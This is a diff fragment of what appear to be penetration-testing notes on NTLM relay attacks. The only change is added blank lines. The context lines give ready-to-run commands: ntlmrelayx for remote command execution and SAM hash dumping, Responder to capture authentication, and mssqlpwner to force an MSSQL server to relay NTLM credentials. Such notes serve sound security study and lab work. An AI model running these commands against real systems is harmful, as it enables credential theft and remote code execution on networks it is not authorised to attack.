@@ -170,7 +170,10 @@ Relay authentication:
 *Note: three tools involved: Responder,ntlmrelayx and mssqlpwner*
 
 Command Execution: `ntlmrelayx.py --no-http-server -smb2support -t 192.168.156.6 -c 'command here'`
+
 SAM Dump: `ntlmrelayx.py --no-http-server -smb2support -t smb://172.16.192.152`
+
 Fire up responder: `sudo responder -I tun0` (make sure SMB is turned OFF in /etc/responder/Responder.conf)
+
 Perform the attack: `mssqlpwner user:pass@<MSSQL INSTANCE IP> -windows-auth ntlm-relay <OUR ATTACKING MACHINE>`
 
